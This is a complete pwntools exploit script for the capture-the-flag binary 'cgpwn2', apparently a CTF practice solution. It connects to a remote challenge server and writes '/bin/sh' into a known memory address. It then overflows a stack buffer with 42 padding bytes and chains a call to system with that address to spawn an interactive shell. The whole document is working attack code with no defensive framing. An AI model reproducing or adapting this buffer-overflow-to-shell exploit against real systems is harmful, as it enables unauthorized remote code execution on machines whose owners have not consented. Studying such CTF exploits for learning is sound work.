from pwn import *
context(arch='i386',os='linux')

elf = ELF('./cgpwn2')
#p = process('./cgpwn2')
p = remote('220.249.52.134', 57468)

p.recvuntil('please tell me your name')
p.sendline('/bin/sh')                       # stored at address 0x804a080
p.recvuntil('hello,you can leave some message here:')

payload =  b'a' * 42                        # fill buffer with garbage
payload += p32(elf.symbols['system'])       # load the system call
payload += p32(0xdeadbeef)                  # dummy address
payload += p32(0x804a080)                   # system('/bin/sh')

p.sendline(payload)
p.interactive()
